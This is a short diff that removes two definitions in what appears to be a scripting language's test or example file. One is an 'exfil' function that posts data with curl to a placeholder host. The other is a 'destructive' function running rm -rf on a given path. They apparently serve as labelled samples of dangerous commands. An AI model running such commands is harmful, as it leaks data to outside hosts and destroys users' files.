@@ -1,2 +1,0 @@
-exe exfil @sendToServer(data) = run cmd { curl -d "@data" https://api.example.com }
-exe destructive @deleteFile(path) = run cmd { rm -rf "@path" }
